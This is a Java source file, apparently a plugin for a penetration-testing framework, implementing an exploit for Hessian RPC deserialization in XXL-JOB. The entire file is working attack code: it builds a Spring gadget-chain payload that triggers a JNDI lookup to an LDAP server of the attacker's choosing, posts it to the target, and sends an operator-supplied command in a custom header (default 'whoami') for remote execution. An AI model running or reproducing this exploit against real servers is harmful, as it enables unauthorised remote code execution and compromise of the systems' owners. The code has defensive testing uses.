package plugins.vul.xxljob;

import me.gv7.woodpecker.marshalsec.Hessian;
import me.gv7.woodpecker.marshalsec.Hessian2;
import me.gv7.woodpecker.plugin.*;
import me.gv7.woodpecker.requests.Header;
import me.gv7.woodpecker.requests.RawResponse;
import me.gv7.woodpecker.requests.Requests;

import java.util.Arrays;
import java.util.Map;

public class Hessian_RPC_Deserialization_JNDI_Exploit implements IExploit {
    private IPluginHelper helper;

    public Hessian_RPC_Deserialization_JNDI_Exploit() {
        helper = Hessian_RPC_Deserialization_Plugin.pluginHelper;
    }

    @Override
    public String getExploitTabCaption() {
        return "反序列化触发JNDI请求";
    }

    @Override
    public IArgsUsageBinder getExploitCustomArgs() {
        IArg headerName = helper.createArg();
        headerName.setName("headerName");
        headerName.setRequired(true);
        headerName.setDefaultValue("cmd");
        headerName.setDescription("自定义http请求头");

        IArg headerValue = helper.createArg();
        headerValue.setName("headerValue");
        headerValue.setRequired(true);
        headerValue.setDefaultValue("whoami");

        IArg jndiUrl = helper.createArg();
        jndiUrl.setName("jndi-url");
        jndiUrl.setRequired(true);
        jndiUrl.setDefaultValue("ldap://127.0.0.1:1389");
        jndiUrl.setDescription("jndi url地址");

        IArg hessianProtocolVersion = helper.createArg();
        hessianProtocolVersion.setName("version");
        hessianProtocolVersion.setRequired(true);
        hessianProtocolVersion.setDefaultValue("1");
        hessianProtocolVersion.setEnumValue(Arrays.asList("1","2"));
        hessianProtocolVersion.setDescription("hessian协议版本");

        IArgsUsageBinder usageBinder = helper.createArgsUsageBinder();
        usageBinder.setArgsList(Arrays.asList(headerName,headerValue,jndiUrl,hessianProtocolVersion));
        return usageBinder;
    }

    @Override
    public void doExploit(ITarget iTarget, Map<String, Object> map, IResultOutput iResultOutput) throws Throwable {
        String jndiUrl = (String) map.get("jndi-url");
        String version = (String) map.get("version");
        String headerName = (String) map.get("headerName");
        String headerValue = (String) map.get("headerValue");
        byte[] payload = version.equals("2") ?
                new Hessian2().apiRun("SpringAbstractBeanFactoryPointcutAdvisor", new String[]{jndiUrl}) :
                new Hessian().apiRun("SpringAbstractBeanFactoryPointcutAdvisor", new String[]{jndiUrl});
        RawResponse response = Requests.post(iTarget.getAddress())
                .headers(
                        new Header("Content-Type","x-application/hessian"),
                        new Header(headerName,headerValue))
                .body(payload)
                .send();
        iResultOutput.infoPrintln("request send complete");
    }
}
